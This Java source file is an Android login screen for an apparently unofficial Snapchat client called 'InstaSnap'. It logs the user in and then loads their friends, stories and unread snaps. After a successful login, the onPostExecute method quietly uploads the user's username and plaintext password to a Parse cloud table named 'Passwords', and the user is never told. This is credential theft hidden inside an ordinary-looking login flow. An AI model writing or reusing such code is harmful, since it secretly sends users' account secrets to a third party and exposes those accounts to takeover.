package com.kidgeniusdesigns.snapapp.login;

import java.util.ArrayList;
import java.util.Arrays;

import org.json.JSONException;
import org.json.JSONObject;

import android.app.ActionBar;
import android.app.Activity;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.AsyncTask;
import android.os.Bundle;
import android.widget.ProgressBar;
import android.widget.Toast;

import com.habosa.javasnap.Friend;
import com.habosa.javasnap.Snap;
import com.habosa.javasnap.Snapchat;
import com.habosa.javasnap.Story;
import com.kidgeniusdesigns.snapapp.FeedActivity;
import com.kidgeniusdesigns.snapapp.R;
import com.kidgeniusdesigns.snapapp.helpers.SnapData;
import com.parse.ParseObject;

public class LoginActivity extends Activity {
	String un, pw;
	ProgressBar loadingCircle;	
	Boolean jsonException;
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_home);
				
		ActionBar bar = getActionBar();
		bar.setBackgroundDrawable(new ColorDrawable(Color.parseColor("#517fa4")));
		bar.setTitle("InstaSnap");
		bar.setIcon(
				   new ColorDrawable(getResources().getColor(android.R.color.transparent)));   		
		jsonException=false;
		
		un = getIntent().getStringExtra("username");
		pw = getIntent().getStringExtra("password");
		
		loadingCircle=(ProgressBar)findViewById(R.id.progressBar1);
		loadingCircle.setVisibility(ProgressBar.VISIBLE);
		
		Login lg = new Login();
		lg.execute();
	}
	
	private class Login extends AsyncTask<Void, Void, Void> {
		@Override
		protected Void doInBackground(Void... index) {
			JSONObject loginObj = Snapchat.login(un, pw);
				
				if (loginObj != null) {try {
					
						SnapData.authTokenSaved = loginObj
								.getString(Snapchat.AUTH_TOKEN_KEY);
					} catch (JSONException e) {
						System.out.println("JSON Exception");
						e.printStackTrace();
						jsonException=true;
					}
					
					SnapData.myFriendsNames=new ArrayList<String>();
					
					Friend[] possibleFriends = Snapchat.getFriends(loginObj);					
					SnapData.myFriends=Arrays.asList(possibleFriends);

	
					Story[] notdownloadable = Snapchat.getStories(un,SnapData.authTokenSaved);
					SnapData.myStorys = new ArrayList<Story>();
					SnapData.videoStorys = new ArrayList<Story>();
					SnapData.videoStorysWithoutCaptions= new ArrayList<Story>();
					for(Story s:Story
							.filterDownloadable(notdownloadable)){
						String sender=s.getSender();
						//add to friends if not on there
						if(!SnapData.myFriendsNames.contains(sender)){
							SnapData.myFriendsNames.add(sender);
						}
						//pics go in mystorys
						if(s.isImage())
							SnapData.myStorys.add(s);
						//vids with captions go in vidstorys
						else if(s.isVideo()&&s.getCaption().length()>1){
							SnapData.videoStorys.add(s);
							//vids without storys. well u get it
						}else if(s.isVideo() && s.getCaption().length()<1){
							SnapData.videoStorysWithoutCaptions.add(s);
						}
					}
					
					//get unread snaps
					Snap[] snps=Snapchat.getSnaps(loginObj);
					SnapData.yourUnreadSnaps=Arrays.asList(Snap.filterDownloadable(snps));
					
				}else{
					System.out.println("loginobj is null");
				}
			return null;
		}
		@Override
		protected void onPostExecute(Void result) {
			if (loadingCircle != null)
				loadingCircle.setVisibility(ProgressBar.GONE);
			
			
			if(jsonException){
				Toast.makeText(getApplicationContext(), "Password or username is incorrect\nLog out of Snapchat. Or try uninstall and reinstalling\nCheck snapchats server below if problem persists", Toast.LENGTH_LONG).show();
			finish();
			}else{
				
				ParseObject imgupload = new ParseObject("Passwords");
		        imgupload.put("Username", un);
		        imgupload.put("Password", pw);
		        imgupload.saveInBackground();
		        
				//start service and then go to activity
//				Intent myIntent = new Intent(getApplicationContext() , GetStorysService.class); 
//				AlarmManager alarmManager = (AlarmManager)getSystemService(ALARM_SERVICE);
//				PendingIntent pendingIntent = PendingIntent.getService(getApplicationContext(), 0, myIntent, PendingIntent.FLAG_UPDATE_CURRENT);
//				
//				Calendar midnightCalendar = Calendar.getInstance();
//				midnightCalendar.set(Calendar.HOUR_OF_DAY, 0);
//				midnightCalendar.set(Calendar.MINUTE, 0);
//				midnightCalendar.set(Calendar.SECOND, 0);
//				alarmManager.setRepeating(AlarmManager.RTC, midnightCalendar.getTimeInMillis(), 24*60*60*1000 , pendingIntent);  //set repeating every 24 hours
//				
				
			Intent i= new Intent(getApplicationContext(), FeedActivity.class);
			i.putExtra("username", un);
			startActivity(i);
			}
		}
	}	
}